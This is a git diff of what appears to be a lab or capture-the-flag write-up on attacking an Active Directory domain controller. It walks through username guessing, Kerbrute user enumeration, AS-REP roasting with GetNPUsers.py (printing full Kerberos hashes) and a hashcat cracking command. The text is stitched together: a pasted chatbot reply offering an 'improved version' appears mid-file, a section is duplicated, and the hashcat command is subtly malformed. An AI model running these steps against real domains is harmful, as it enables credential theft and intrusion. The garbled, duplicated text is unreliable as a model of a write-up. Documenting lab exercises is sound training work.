@@ -74,21 +74,120 @@ Nmap done: 1 IP address (1 host up) scanned in 40.47 seconds
     3268/tcp & 3269/tcp (LDAP - Global Catalog): Global Catalog for querying across AD domains.
     3389/tcp (RDP): RDP service may be exploited for remote access via weak credentials or known vulnerabilities.
 
-After searching the website for information, came across the contact from that gave me an ideia of how the emails of users are 
-constructed: <firstLetterOfFirstName>.<lastname>@services.local
+During my investigation, I discovered a pattern for constructing user email addresses within the organization: <firstLetterOfFirstName>.<lastname>@services.local. This insight enabled me to compile a list of potential user accounts based on the staff members displayed on the organization's website. Below is the constructed list of usernames:
 
-With these information I was able to get the users of all the members of staff displayed in the website following the format above.
+    j.rock for Joanne Doe
+    j.rock for Jack Rock
+    w.masters for Will Masters
+    j.larusso for Johnny LaRusso
 
-    1. j.rock for Joanne Doe
-    2. j.rock for Jack Rock
-    3. w.masters for Will Masters
-    4. j.larusso for Johnny LaRusso
+I saved these usernames to a text file for further analysis.
 
-Next step is to use Kerbrute to see if these are valid credentials.
+**Validating Usernames with Kerbrute**
+
+The next step was to verify the validity of these usernames using Kerbrute. I executed the following command:
+
+```
+./kerbrute_linux_amd64 userenum -d services.local users.txt --dc 10.10.160.39
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/08/24 - Ronnie Flathers @ropnop
+
+2024/10/08 18:27:31 >  Using KDC(s):
+2024/10/08 18:27:31 >   10.10.160.39:88
+
+2024/10/08 18:27:31 >  [+] VALID USERNAME:       j.larusso@services.local
+2024/10/08 18:27:31 >  [+] VALID USERNAME:       w.masters@services.local
+2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
+2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
+2024/10/08 18:27:32 >  Done! Tested 4 usernames (4 valid) in 1.342 seconds
+
+```
+Here's an improved version of your GitHub write-up, structured for clarity and professionalism while maintaining the essential details of your findings and actions:
+User Enumeration and Validating Credentials
+
+During my investigation, I discovered a pattern for constructing user email addresses within the organization: <firstLetterOfFirstName>.<lastname>@services.local. This insight enabled me to compile a list of potential user accounts based on the staff members displayed on the organization's website. Below is the constructed list of usernames:
+
+    j.rock for Joanne Doe
+    j.rock for Jack Rock
+    w.masters for Will Masters
+    j.larusso for Johnny LaRusso
+
+I saved these usernames to a text file for further analysis.
+Validating Usernames with Kerbrute
+
+The next step was to verify the validity of these usernames using Kerbrute. I executed the following command:
+
+bash
+
+./kerbrute_linux_amd64 userenum -d services.local users.txt --dc 10.10.160.39
+
+Kerbrute Output:
+
+typescript
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/08/24 - Ronnie Flathers @ropnop
+
+2024/10/08 18:27:31 >  Using KDC(s):
+2024/10/08 18:27:31 >   10.10.160.39:88
+
+2024/10/08 18:27:31 >  [+] VALID USERNAME:       j.larusso@services.local
+2024/10/08 18:27:31 >  [+] VALID USERNAME:       w.masters@services.local
+2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
+2024/10/08 18:27:32 >  [+] VALID USERNAME:       j.rock@services.local
+2024/10/08 18:27:32 >  Done! Tested 4 usernames (4 valid) in 1.342 seconds
+
+All four usernames were confirmed as valid.
+Retrieving Kerberos AS-REP Hashes
+
+Subsequently, I utilized GetNPUsers.py to query the domain controller for any users lacking the necessary flag for 
+pre-authentication.
+This allowed me to retrieve the Kerberos AS-REP (Authentication Service Response) hashes for the valid users. 
+
+The command I ran was:
+
+```
+sudo ./GetNPUsers.py -dc-ip 10.10.160.39 -request 'services.local/' -usersfile /home/andrepaiva/users.txt -format hashcat 
+Impacket v0.12.0.dev1 - Copyright 2023 Fortra
+
+$krb5asrep$23$j.rock@SERVICES.LOCAL:2604b6f37de5269ca3be902a30424655$0607d6ebbf4ceab95a764b1c130fbc1d680b0dbab54db508532913c65c4cfa1654bd23a7e3f76613f6cf58e630becfbbfa248b314ab33d17f07d106ceef5c00dbb8c385ecc99382c4238fc5d4afbeca447b5faa3c2cffdcaad2816f4ea6d8675fe484ac677473b711b253c2bea517c6eed5a8de3b4c8a48ea1a2d683746df67de8fd8f2aa9d6074d140f89cabfbe74a46aba4d46dc7f4b03cf4b833239fd45c68957126cacaea22057a6a220a375219436f2ca0b8b2531468e989e1168738d09905523991489bffa7bee7306ab6bac4498063f2b2c7f44a67401590c0ed677c77836281a5a918312c34f7668d7f3a3d9
+$krb5asrep$23$j.rock@SERVICES.LOCAL:e10c9deff09d5d95e0e596a390c6bb67$521be42f3d1d4f4c91e9ea1dcfdc6d2aab13b6eff01ef8c3484a8c59734814e6ced04708f67d0bfb0bed727f41e73f1182ff7581231e5a0eb118bdcf633ac31aa8db09d2bc622582b3dbb26b6bdfa0adc47bd17f88e320575988fe91f90c71f7587ad86ca01067d4e1eec457a1e1f261c0f082a239438fe772c1506a2691177e9fa774a564069ab3e586d1d6fd373a29854a891eba66dd301cf4a077682ee01eb207837a5d2599447dfa659e3c027d4238840f40f12aac38b5961194c7df0ba0d3e5c216ddd43d6c3f52433104c809ff64de2bdfe860c54a4289c7dcefabba15ac6ac07de21c733c2fc74df0e63f70c6
+[-] User w.masters doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User j.larusso doesn't have UF_DONT_REQUIRE_PREAUTH set
 
 ```
 
+After successfully retrieved a hash, which can be cracked using Hashcat like so:
+
 ```
+$ hashcat -m 18200 -a 0 -o hashes.txt /usr/share/wordlists/rockyou.txt -v 
+hashcat (v6.2.6) starting
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
